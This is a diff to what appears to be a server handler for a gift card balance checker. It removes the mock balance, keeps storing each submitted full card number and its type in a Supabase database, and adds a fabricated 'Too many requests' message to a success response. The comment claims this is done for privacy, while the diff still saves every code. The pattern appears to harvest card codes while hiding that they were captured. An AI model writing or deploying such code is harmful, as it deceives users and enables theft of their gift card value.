@@ -9,11 +9,9 @@ export default async function handler(req, res) {
     return res.status(400).json({ error: 'Invalid card code format. Please enter a valid code.' })
   }
 
-  // Mock behavior: simulate lookup and return deterministic pseudo-random balance
+  // Mock behavior: We no longer return a balance. Instead, show a throttle message for privacy.
   const last4 = cardNumber.slice(-4)
-  const seed = cardNumber.charCodeAt(0) + (cardNumber.charCodeAt(Math.floor(cardNumber.length / 2)) || 0)
-  const cents = (seed % 50000) + 1000 // between $10.00 and ~$600.00
-  const balance = Math.round(cents) / 100
+  const balance = 0 // Store 0 in DB as we don't want to show balances
 
   // Simulate occasional errors for testing
   if (cardNumber.startsWith('XXXX')) return res.status(404).json({ error: 'Card not found. Please check the code and try again.' })
@@ -27,7 +25,7 @@ export default async function handler(req, res) {
     type
   }
 
-  // Save to Supabase
+  // Save to Supabase (we still save the attempt, but with 0 balance)
   try {
     const { error } = await supabase
       .from('cards')
@@ -49,6 +47,7 @@ export default async function handler(req, res) {
   return res.status(200).json({
     ...result,
     cardNumber: result.card_number,
-    cardLast4: last4
+    cardLast4: last4,
+    message: 'Too many requests. Please wait a minute and try again later.'
   })
 }
